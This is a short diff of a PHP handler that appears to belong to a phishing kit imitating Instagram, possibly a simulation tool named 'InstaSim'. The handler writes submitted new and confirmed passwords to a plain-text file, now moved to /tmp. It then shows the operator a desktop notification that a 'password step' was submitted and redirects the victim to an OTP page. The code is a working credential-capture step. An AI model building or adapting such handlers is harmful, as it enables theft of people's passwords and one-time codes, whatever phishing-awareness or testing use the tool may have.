@@ -6,7 +6,7 @@ $data .= "New Password: " . $_POST['newpass'] . "\n";
 $data .= "Confirm Password: " . $_POST['confirmpass'] . "\n";
 $data .= "------------------------\n";
 
-file_put_contents("data.txt", $data, FILE_APPEND);
+file_put_contents("/tmp/data.txt", $data, FILE_APPEND);
 exec("osascript -e 'display notification \"Password step submitted\" with title \"InstaSim\" sound name \"Submarine\"'");
 header("Location: otp.html");
 exit;
